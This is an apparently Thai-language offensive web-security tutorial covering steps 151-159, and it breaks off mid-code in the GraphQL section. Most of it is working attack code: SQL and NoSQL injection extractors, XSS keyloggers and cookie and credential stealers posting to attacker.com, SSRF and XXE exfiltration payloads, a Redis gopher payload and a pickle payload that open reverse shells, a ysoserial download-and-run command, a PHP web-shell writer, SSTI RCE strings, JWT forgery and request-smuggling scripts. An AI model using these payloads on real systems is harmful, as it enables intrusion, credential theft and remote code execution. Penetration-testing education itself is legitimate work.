# Part 16: Web Application Advanced Attacks
# ขั้นตอนที่ 151-160: การโจมตี Web Application ขั้นสูง

> **คำเตือน**: เนื้อหานี้มีไว้เพื่อการศึกษาและทดสอบในสภาพแวดล้อมที่ได้รับอนุญาตเท่านั้น

---

## ขั้นตอนที่ 151: SQL Injection Advanced Techniques

### 151.1 Union-Based SQL Injection

```bash
# sqlmap - Automated SQL Injection Tool
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# ใช้ Cookie-based authentication
sqlmap -u "http://target.com/profile" \
    --cookie="session=abc123" \
    --data="id=1" \
    --level=5 --risk=3

# Time-based blind SQLi
sqlmap -u "http://target.com/?id=1" \
    --technique=T \
    --dbms=mysql

# Second-order SQLi
sqlmap -u "http://target.com/register" \
    --data="username=admin'--&password=test" \
    --second-url="http://target.com/profile"

# Bypass WAF
sqlmap -u "http://target.com/?id=1" \
    --tamper=space2comment,between,randomcase \
    --random-agent
```

### 151.2 Manual SQL Injection

```python
#!/usr/bin/env python3
# manual_sqli.py - Manual SQLi Testing

import requests
import string
import time

TARGET = "http://localhost:8080/vuln"

def test_boolean_blind(base_url, param):
    """Boolean-based blind SQL injection"""
    # Test if vulnerable
    true_payload = f"1' AND '1'='1"
    false_payload = f"1' AND '1'='2"
    
    r_true = requests.get(base_url, params={param: true_payload})
    r_false = requests.get(base_url, params={param: false_payload})
    
    if len(r_true.text) != len(r_false.text):
        print("[+] Boolean blind SQLi detected!")
        return True
    return False

def extract_data_blind(base_url, param, query):
    """Extract data character by character"""
    result = ""
    
    for pos in range(1, 50):
        low, high = 32, 126
        found = False
        
        while low <= high:
            mid = (low + high) // 2
            # Binary search to find character
            payload = f"1' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
            r = requests.get(base_url, params={param: payload})
            
            # Adjust condition based on response
            if "admin" in r.text:  # True condition
                low = mid + 1
            else:
                high = mid - 1
        
        char = chr(low)
        if ord(char) <= 32:
            break
        result += char
        print(f"[*] Found: {result}", end='\r')
    
    print(f"\n[+] Result: {result}")
    return result

def time_based_blind(base_url, param, query):
    """Time-based blind SQL injection"""
    result = ""
    
    for pos in range(1, 50):
        for char in string.printable:
            payload = f"1'; IF(ASCII(SUBSTRING(({query}),{pos},1))={ord(char)},SLEEP(2),0)-- -"
            
            start = time.time()
            try:
                requests.get(base_url, params={param: payload}, timeout=3)
            except requests.Timeout:
                result += char
                print(f"[*] Found: {result}", end='\r')
                break
        else:
            break
    
    print(f"\n[+] Result: {result}")
    return result

# Common SQLi payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "'; DROP TABLE users;--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT username,password FROM users--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",  # Error when column count exceeded
]

print("[*] SQL Injection Payloads:")
for p in SQLI_PAYLOADS:
    print(f"  {p!r}")
```

### 151.3 NoSQL Injection

```python
#!/usr/bin/env python3
# nosql_injection.py - MongoDB/NoSQL Injection

import requests
import json

TARGET = "http://localhost:3000"

def test_mongodb_injection(url, data):
    """Test MongoDB injection"""
    
    # Operator injection
    payloads = [
        # Bypass authentication
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": "admin", "password": {"$ne": "wrong"}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        
        # Data extraction with $where
        {"username": "admin", "$where": "this.password.length > 0"},
        
        # JavaScript injection (if enabled)
        {"username": "admin", "password": {"$where": "sleep(5000)"}},
    ]
    
    for payload in payloads:
        headers = {"Content-Type": "application/json"}
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=3)
            print(f"[*] Payload: {payload}")
            print(f"    Status: {r.status_code}, Length: {len(r.text)}")
            if r.status_code == 200 and 'token' in r.text.lower():
                print(f"    [+] SUCCESS! Response: {r.text[:200]}")
        except Exception as e:
            print(f"    [!] Error: {e}")

def mongodb_extract_blind(url, field):
    """Extract data from MongoDB using boolean blind"""
    result = ""
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%'
    
    for i in range(1, 100):
        for char in charset:
            # Use $regex for blind extraction
            payload = {
                "username": "admin",
                "password": {"$regex": f"^{re.escape(result + char)}"}
            }
            
            r = requests.post(url, json=payload, 
                            headers={"Content-Type": "application/json"})
            
            if r.status_code == 200 and 'success' in r.text:
                result += char
                print(f"[*] Found: {result}", end='\r')
                break
        else:
            break
    
    print(f"\n[+] Extracted {field}: {result}")
    return result

test_mongodb_injection(f"{TARGET}/api/login", {})
```

---

## ขั้นตอนที่ 152: Cross-Site Scripting (XSS) Advanced

### 152.1 XSS Payload Development

```javascript
// xss_payloads.js - Advanced XSS Payloads

// Basic payloads
const basic_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"onmouseover="alert(1)',
    "';alert(1)//",
];

// WAF Bypass payloads
const waf_bypass = [
    // Case variations
    '<ScRiPt>alert(1)</ScRiPt>',
    
    // Encoding
    '<script>\u0061lert(1)</script>',
    '<%73cript>alert(1)</%73cript>',
    
    // HTML entities
    '<script>&#x61;lert(1)</script>',
    
    // Tag splitting
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    
    // Alternative events
    '<body onpageshow=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<select onchange=alert(1)><option>1</option></select>',
    
    // SVG-based
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributeName=x>',
    
    // CSS-based
    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)></div>',
    
    // Template literals
    '${alert(1)}',
    '#{alert(1)}',
];

// Keylogger payload
const keylogger = `
<script>
document.addEventListener('keypress', function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://attacker.com/log?key=' + e.key, true);
    xhr.send();
});
</script>
`;

// Cookie stealer
const cookie_stealer = `
<script>
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
// Or:
var img = new Image();
img.src = 'https://attacker.com/steal?c=' + btoa(document.cookie);
</script>
`;

// BeEF hook (Browser Exploitation Framework)
const beef_hook = `
<script src="http://attacker.com:3000/hook.js"></script>
`;

// DOM manipulation
const dom_attack = `
<script>
// Replace login form to capture credentials
document.querySelector('form').addEventListener('submit', function(e) {
    var creds = {
        user: document.querySelector('input[type=text]').value,
        pass: document.querySelector('input[type=password]').value
    };
    fetch('https://attacker.com/creds', {
        method: 'POST',
        body: JSON.stringify(creds)
    });
});
</script>
`;
```

### 152.2 DOM-based XSS

```python
#!/usr/bin/env python3
# dom_xss_scanner.py - DOM XSS Scanner

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import json
import time

def scan_dom_xss(url):
    """Scan for DOM XSS vulnerabilities"""
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.binary_location = '/opt/pw-browsers/chromium'
    
    driver = webdriver.Chrome(options=options)
    
    # DOM XSS sinks to check
    sinks = [
        'document.write', 'document.writeln',
        'innerHTML', 'outerHTML',
        'eval', 'setTimeout', 'setInterval',
        'location.href', 'location.replace',
        'document.cookie'
    ]
    
    # Source parameters
    sources = [
        'location.hash',
        'location.search', 
        'document.referrer',
        'window.name'
    ]
    
    payloads = [
        '#<img src=x onerror=alert(1)>',
        '?q=<script>alert(1)</script>',
        '#javascript:alert(1)',
    ]
    
    findings = []
    
    for payload in payloads:
        test_url = url + payload
        driver.get(test_url)
        time.sleep(2)
        
        # Check for alerts
        try:
            alert = driver.switch_to.alert
            findings.append({
                'url': test_url,
                'payload': payload,
                'type': 'DOM XSS - Alert triggered'
            })
            alert.dismiss()
        except:
            pass
        
        # Check page source for sinks with user input
        page_source = driver.page_source
        for sink in sinks:
            if sink in page_source and payload[1:] in page_source:
                findings.append({
                    'url': test_url,
                    'payload': payload,
                    'sink': sink,
                    'type': 'Potential DOM XSS'
                })
    
    driver.quit()
    return findings

# Run scan
if __name__ == '__main__':
    url = 'http://localhost:8080'
    results = scan_dom_xss(url)
    print(json.dumps(results, indent=2))
```

---

## ขั้นตอนที่ 153: Server-Side Request Forgery (SSRF)

### 153.1 SSRF Detection และ Exploitation

```python
#!/usr/bin/env python3
# ssrf_scanner.py - SSRF Vulnerability Scanner

import requests
import socket
from urllib.parse import urlparse

TARGET = "http://target.com/fetch?url="

# Internal targets to probe
INTERNAL_TARGETS = [
    # Cloud metadata services
    "http://169.254.169.254/latest/meta-data/",                    # AWS
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # AWS IAM
    "http://metadata.google.internal/computeMetadata/v1/",         # GCP
    "http://169.254.169.254/metadata/v1/",                        # Azure old
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    
    # Internal services
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",  # IPv6 localhost
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    
    # Internal admin panels
    "http://localhost:8080/",
    "http://localhost:8443/",
    "http://localhost:9200/",   # Elasticsearch
    "http://localhost:6379/",   # Redis
    "http://localhost:27017/",  # MongoDB
    "http://localhost:5432/",   # PostgreSQL
    "http://localhost:3306/",   # MySQL
]

# SSRF Bypass techniques
SSRF_BYPASSES = [
    # Encoding
    "http://2130706433/",           # 127.0.0.1 as decimal
    "http://0x7f000001/",           # 127.0.0.1 as hex
    "http://0177.0.0.1/",           # 127.0.0.1 as octal
    
    # DNS rebinding
    "http://attacker.com@127.0.0.1/",
    "http://127.0.0.1.attacker.com/",
    
    # Alternative schemes
    "file:///etc/passwd",
    "file:///etc/hosts",
    "dict://127.0.0.1:6379/info",   # Redis via dict://
    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",  # Redis flush
    
    # Cloud metadata with bypass
    "http://169.254.169.254.attacker.com/latest/meta-data/",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
]

def test_ssrf(target_url, ssrf_url):
    """Test SSRF by sending request to internal URL"""
    try:
        r = requests.get(
            target_url + requests.utils.quote(ssrf_url, safe=''),
            timeout=5,
            allow_redirects=False
        )
        
        if r.status_code in [200, 301, 302]:
            print(f"[+] Possible SSRF: {ssrf_url}")
            print(f"    Status: {r.status_code}")
            print(f"    Content-Type: {r.headers.get('content-type', 'N/A')}")
            print(f"    Body preview: {r.text[:200]}")
            return True
    except Exception:
        pass
    return False

# Redis SSRF Attack (RCE via SSRF)
REDIS_SSRF_GOPHER = (
    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0A"
    "flushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0A%0A"
    "%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F"
    "192.168.1.100%2F4444%200%3E%261%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0A"
    "config%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2F"
    "spool%2Fcron%2F%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0A"
    "dbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A"
)

print("[*] SSRF Scanner Starting...")
for internal in INTERNAL_TARGETS[:5]:  # Test first 5
    test_ssrf(TARGET, internal)
```

---

## ขั้นตอนที่ 154: XML External Entity (XXE) Injection

### 154.1 XXE Attack Techniques

```python
#!/usr/bin/env python3
# xxe_attack.py - XXE Injection Testing

import requests

TARGET = "http://target.com/api/upload"

# Basic XXE payloads
XXE_PAYLOADS = {
    # File read
    'file_read': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>''',

    # Windows file read
    'win_file_read': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root><data>&xxe;</data></root>''',

    # SSRF via XXE
    'ssrf': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>''',

    # Blind XXE with OOB (Out-of-Band)
    'blind_oob': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://attacker.com/dtd.xml">
  %xxe;
]>
<root><data>test</data></root>''',

    # Parameter entity (bypass some filters)
    'param_entity': '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>''',

    # XInclude (no DOCTYPE needed)
    'xinclude': '''<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>''',

    # SVG XXE
    'svg_xxe': '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">
  <text>&xxe;</text>
</svg>'''
}

def test_xxe(url, payload, content_type='application/xml'):
    headers = {'Content-Type': content_type}
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=10)
        print(f"[*] Status: {r.status_code}")
        if 'root:' in r.text or '/bin/bash' in r.text:
            print(f"[+] XXE SUCCESSFUL! /etc/passwd leaked:")
            print(r.text[:500])
            return True
        elif r.status_code == 200:
            print(f"    Response: {r.text[:200]}")
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

# Attacker's DTD file content (host on attacker server)
ATTACKER_DTD = '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8080/?data=%file;'>">
%eval;
%send;'''

print("[*] Testing XXE payloads...")
for name, payload in XXE_PAYLOADS.items():
    print(f"\n[*] Trying: {name}")
    test_xxe(TARGET, payload)
```

---

## ขั้นตอนที่ 155: Insecure Deserialization

### 155.1 Java Deserialization

```bash
# ysoserial - Java Deserialization Payloads
# https://github.com/frohoff/ysoserial

# ดาวน์โหลด
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# สร้าง payload สำหรับ CommonsCollections gadget chain
java -jar ysoserial-all.jar CommonsCollections6 'wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh' > payload.ser

# ส่ง payload
curl -s -X POST http://target.com/api/deserialize \
    --data-binary @payload.ser \
    -H "Content-Type: application/x-java-serialized-object"

# ตรวจสอบ gadget chains ที่รองรับ
java -jar ysoserial-all.jar --help

# Gadget chains ที่พบบ่อย:
# CommonsCollections1-7 (Apache Commons Collections)
# Spring1, Spring2 (Spring Framework)
# Hibernate1, Hibernate2
# JRMPClient (Java RMI)
# URLDNS (DNS lookup - for testing)

# URLDNS - ทดสอบว่า deserialize ได้จริงไหม (ไม่ต้อง classpath)
java -jar ysoserial-all.jar URLDNS 'http://collaborator.attacker.com' > test.ser
curl -X POST http://target.com/deserialize --data-binary @test.ser
```

### 155.2 PHP Object Injection

```php
<?php
// vulnerable_app.php - Example vulnerable code
class Config {
    public $path = "/tmp/default";
    
    public function __wakeup() {
        // Runs on unserialize() - DANGEROUS!
        $this->settings = file_get_contents($this->path);
    }
}

class Logger {
    public $logFile = "/var/log/app.log";
    public $message = "";
    
    public function __destruct() {
        // Runs when object destroyed - DANGEROUS!
        file_put_contents($this->logFile, $this->message);
    }
}

// Vulnerable endpoint
$data = base64_decode($_COOKIE['data']);
$obj = unserialize($data);  // DANGEROUS!
?>
```

```python
#!/usr/bin/env python3
# php_deserialization.py - Generate PHP serialized payload

import base64
import requests

def generate_php_payload_logger(log_file, content):
    """Generate PHP serialized Logger object for file write"""
    # O:6:"Logger":2:{s:7:"logFile";s:XX:"PATH";s:7:"message";s:XX:"CONTENT";}
    log_file_escaped = log_file.replace('"', '\\"')
    content_escaped = content.replace('"', '\\"')
    
    payload = (
        f'O:6:"Logger":2:{{'
        f's:7:"logFile";s:{len(log_file)}:"{log_file}";'
        f's:7:"message";s:{len(content)}:"{content}";'
        f'}}'
    )
    
    return base64.b64encode(payload.encode()).decode()

def generate_php_payload_config(file_to_read):
    """Generate PHP serialized Config object for file read"""
    payload = (
        f'O:6:"Config":1:{{'
        f's:4:"path";s:{len(file_to_read)}:"{file_to_read}";'
        f'}}'
    )
    return base64.b64encode(payload.encode()).decode()

# Web shell payload
web_shell = '<?php system($_GET["cmd"]); ?>'
webshell_payload = generate_php_payload_logger(
    "/var/www/html/shell.php",
    web_shell
)
print(f"[*] Web shell payload (Cookie):")
print(f"    data={webshell_payload}")
print(f"\n[*] Usage after upload:")
print(f"    curl http://target.com/shell.php?cmd=id")

# File read payload
passwd_payload = generate_php_payload_config("/etc/passwd")
print(f"\n[*] File read payload (Cookie):")
print(f"    data={passwd_payload}")

# Send payload
TARGET = "http://localhost:8080/vulnerable.php"
headers = {"Cookie": f"data={webshell_payload}"}
try:
    r = requests.get(TARGET, headers=headers, timeout=5)
    print(f"\n[*] Response: {r.status_code}")
    print(r.text[:200])
except Exception as e:
    print(f"[-] Error: {e}")
```

### 155.3 Python Pickle Deserialization

```python
#!/usr/bin/env python3
# pickle_exploit.py - Python Pickle RCE

import pickle
import base64
import os
import requests

class RCE:
    def __reduce__(self):
        # Command to execute when unpickled
        cmd = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
        return (os.system, (cmd,))

def generate_pickle_payload(command):
    """Generate pickle payload for code execution"""
    class Exploit:
        def __reduce__(self):
            return (os.system, (command,))
    
    payload = pickle.dumps(Exploit())
    return base64.b64encode(payload).decode()

# Generate payload
command = "wget http://192.168.1.100/shell.sh -O /tmp/s.sh && bash /tmp/s.sh"
payload = generate_pickle_payload(command)

print(f"[*] Pickle RCE Payload (base64):")
print(payload)

# Send to vulnerable endpoint
TARGET = "http://localhost:5000/api/load"
try:
    r = requests.post(
        TARGET,
        json={"data": payload},
        timeout=5
    )
    print(f"\n[*] Response: {r.status_code}")
except Exception as e:
    print(f"[-] Error: {e}")

# Test locally
print("\n[*] Testing locally (safe command):")
safe_payload = generate_pickle_payload("id")
result = pickle.loads(base64.b64decode(safe_payload))
print(f"Result: {result}")
```

---

## ขั้นตอนที่ 156: Server-Side Template Injection (SSTI)

### 156.1 SSTI Detection

```python
#!/usr/bin/env python3
# ssti_scanner.py - SSTI Detection Tool

import requests

TARGET = "http://target.com/greet"

# Detection payloads (แต่ละ template engine)
SSTI_DETECTION = {
    'Jinja2/Python': [
        '{{7*7}}',           # Expect: 49
        '{{7*"7"}}',         # Jinja2: 7777777, Twig: 49
        '{{config}}',
        '{{self}}',
    ],
    'Twig/PHP': [
        '{{7*7}}',           # Expect: 49
        '{{7*"7"}}',         # Expect: 49
        '{{dump(app)}}',
    ],
    'Freemarker/Java': [
        '${7*7}',            # Expect: 49
        '#{7*7}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    ],
    'Velocity/Java': [
        '#set($x=7*7)$x',   # Expect: 49
        '$class.inspect("java.lang.Runtime").exec("id")',
    ],
    'Smarty/PHP': [
        '{7*7}',             # Expect: 49
        '{php}phpinfo(){/php}',
    ],
    'Mako/Python': [
        '${7*7}',
        '${"test".upper()}',
    ],
    'ERB/Ruby': [
        '<%= 7*7 %>',        # Expect: 49
        '<%= `id` %>',
    ],
    'Pebble/Java': [
        '{{7*7}}',
        '{{ someString.toUPPERCASE() }}',
    ]
}

# RCE payloads
SSTI_RCE = {
    'Jinja2': [
        # Python RCE via Jinja2
        "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        
        # Config-based RCE
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        
        # cycler.next trick
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        
        # Lipsum trick
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        
        # Namespace trick (Jinja2 >= 2.10)
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    ],
    'Twig': [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id'] | filter('system')}}",
    ],
    'Freemarker': [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '${"freemarker.template.utility.Execute"?new()("id")}',
    ],
    'ERB': [
        '<%= `id` %>',
        '<%= system("id") %>',
        "<%= IO.popen('id').readlines() %>",
    ]
}

def detect_ssti(url, param):
    """Detect SSTI vulnerability"""
    for engine, payloads in SSTI_DETECTION.items():
        for payload in payloads:
            try:
                r = requests.get(url, params={param: payload}, timeout=5)
                if '49' in r.text and ('7*7' in payload or '7*7' in payload):
                    print(f"[+] SSTI Detected! Engine might be: {engine}")
                    print(f"    Payload: {payload}")
                    print(f"    Response: {r.text[:200]}")
                    return engine
            except Exception:
                pass
    return None

engine = detect_ssti(TARGET, 'name')
if engine:
    print(f"\n[*] Trying RCE with {engine} payloads...")
    for payload in SSTI_RCE.get(engine, []):
        r = requests.get(TARGET, params={'name': payload})
        print(f"Response: {r.text[:300]}")
```

---

## ขั้นตอนที่ 157: OAuth 2.0 & JWT Attacks

### 157.1 JWT Attacks

```python
#!/usr/bin/env python3
# jwt_attacks.py - JWT Attack Techniques

import json
import base64
import hmac
import hashlib
import requests

def decode_jwt(token):
    """Decode JWT without verification"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    def b64decode(s):
        # JWT uses base64url encoding
        padding = 4 - len(s) % 4
        return base64.urlsafe_b64decode(s + '=' * padding)
    
    header = json.loads(b64decode(parts[0]))
    payload = json.loads(b64decode(parts[1]))
    
    print(f"Header: {json.dumps(header, indent=2)}")
    print(f"Payload: {json.dumps(payload, indent=2)}")
    
    return header, payload, parts[2]

def none_algorithm_attack(token):
    """JWT None Algorithm Attack - remove signature"""
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # Modify payload
    payload['role'] = 'admin'
    payload['sub'] = 'admin'
    
    # Set algorithm to none
    header['alg'] = 'none'
    
    new_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    # Empty signature
    new_token = f"{new_header}.{new_payload}."
    print(f"[+] None algorithm token: {new_token}")
    return new_token

def brute_force_secret(token, wordlist='/usr/share/wordlists/rockyou.txt'):
    """Brute force JWT HMAC secret"""
    parts = token.split('.')
    message = f"{parts[0]}.{parts[1]}".encode()
    
    # Decode signature
    sig = base64.urlsafe_b64decode(parts[2] + '==')
    
    print(f"[*] Brute forcing JWT secret...")
    
    try:
        with open(wordlist, 'r', errors='ignore') as f:
            for i, line in enumerate(f):
                secret = line.strip()
                
                # Try HS256
                test_sig = hmac.new(
                    secret.encode(), message, hashlib.sha256
                ).digest()
                
                if test_sig == sig:
                    print(f"[+] Secret found: {secret!r}")
                    return secret
                
                if i % 10000 == 0:
                    print(f"[*] Tried {i} words...", end='\r')
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist}")
        # Try common secrets
        for secret in ['secret', 'password', 'jwt_secret', 'key', '123456', 
                       'mysecret', 'changeme', 'secretkey']:
            test_sig = hmac.new(
                secret.encode(), message, hashlib.sha256
            ).digest()
            if test_sig == sig:
                print(f"[+] Secret found: {secret!r}")
                return secret
    
    return None

def forge_jwt(payload, secret, algorithm='HS256'):
    """Forge JWT token with known secret"""
    header = {"alg": algorithm, "typ": "JWT"}
    
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    message = f"{header_b64}.{payload_b64}".encode()
    
    if algorithm == 'HS256':
        sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    elif algorithm == 'HS512':
        sig = hmac.new(secret.encode(), message, hashlib.sha512).digest()
    
    sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
    
    token = f"{header_b64}.{payload_b64}.{sig_b64}"
    print(f"[+] Forged token: {token}")
    return token

# Example usage
example_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIn0.SXkD5UKCo1Yr0J-ixM7Zy3a8o0_FAKE_SIGNATURE"

print("[*] Decoding JWT...")
decode_jwt(example_token)

print("\n[*] Testing None Algorithm Attack...")
none_token = none_algorithm_attack(example_token)

print("\n[*] If secret found, forge admin token:")
admin_payload = {"sub": "admin", "role": "admin", "iat": 9999999999}
# forge_jwt(admin_payload, "discovered_secret")
```

---

## ขั้นตอนที่ 158: HTTP Request Smuggling

### 158.1 CL.TE และ TE.CL Smuggling

```python
#!/usr/bin/env python3
# http_smuggling.py - HTTP Request Smuggling

import socket
import ssl

def cl_te_smuggle(host, port=443, use_ssl=True):
    """CL.TE (Content-Length vs Transfer-Encoding) smuggling"""
    
    # Malicious request
    smuggled_request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 130\r\n"         # Frontend uses CL
        "Transfer-Encoding: chunked\r\n"  # Backend uses TE
        "\r\n"
        "0\r\n"                            # Chunked: end
        "\r\n"
        "GET /admin HTTP/1.1\r\n"           # Smuggled request
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    if use_ssl:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=host)
    
    sock.connect((host, port))
    sock.send(smuggled_request.encode())
    
    response = b""
    while True:
        data = sock.recv(4096)
        if not data:
            break
        response += data
    
    sock.close()
    return response.decode('utf-8', errors='ignore')

def te_cl_smuggle(host, port=443, use_ssl=True):
    """TE.CL (Transfer-Encoding vs Content-Length) smuggling"""
    
    smuggled_body = (
        "0\r\n"                             # Chunked: end
        "\r\n"
        "POST /admin HTTP/1.1\r\n"           # Smuggled request
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1"
    )
    
    request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(smuggled_body)}\r\n"
        "Transfer-Encoding: chunked\r\n"   # Backend uses CL (ignores TE)
        "\r\n"
        + smuggled_body
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if use_ssl:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=host)
    
    sock.connect((host, port))
    sock.send(request.encode())
    
    response = b""
    sock.settimeout(5)
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data
    except socket.timeout:
        pass
    
    sock.close()
    return response.decode('utf-8', errors='ignore')

# Tool: smuggler.py
print("[*] HTTP Request Smuggling Tools:")
print("  pip install smuggler")
print("  smuggler -u https://target.com")
print("")
print("  # Burp Suite Extension: HTTP Request Smuggler")
print("  # Install from BApp Store")
```

---

## ขั้นตอนที่ 159: GraphQL Security Testing

### 159.1 GraphQL Enumeration

```python
#!/usr/bin/env python3
# graphql_tester.py - GraphQL Security Testing

import requests
import json

TARGET = "http://target.com/graphql"

def introspection_query(url):
    """Run introspection to discover schema"""
    query = """
    {
      __schema {
        types {
          name
          kind
          fields {
            name
            type {
              name
              kind
            }
          }
        }
        queryType { name }
        mutationType { name }
      }
    }
    """
    
    r = requests.post(url, json={'query': query})
    if r.status_code == 200:
        schema = r.json()
        return schema
    return None

def graphql_injection(url):
    """Test for GraphQL injection"""
    payloads = [
        # SQL injection via GraphQL
        '{user(id: "1 OR 1=1") { username email }}',
        '{user(id: "1\\" UNION SELECT 1,username,password FROM users--") { username }}',
        
        # NoSQL injection
        '{user(username: {$gt: ""}) { username password }}',
        
        # Batch introspection bypass
        '[{"query":"{__typename}"},{"query":"{users{id username password}}"}]',
        
        # Field duplication (DoS)
        '{' + ' '.join(['users { id }' for _ in range(1000)]) + '}',
    ]
    
    for payload in payloads[:3]:
        try:
            r = requests.post(url, json={'query': payload}, timeout=10)
            print(f"[*] Payload: {payload[:80]}...")
            print(f"    Response: {r.text[:200]}")
        except Exception as e:
            print(f"[-] Error: {e}")

def graphql_auth_bypass(url):
    """Test GraphQL authentication bypass"""
    queries = [
        # Access admin mutations
        'mutation { updateUser(id: 1, role: "admin") { id role } }',
        
        # IDOR via GraphQL
        '{ user(id: 1) { id username email password } }',
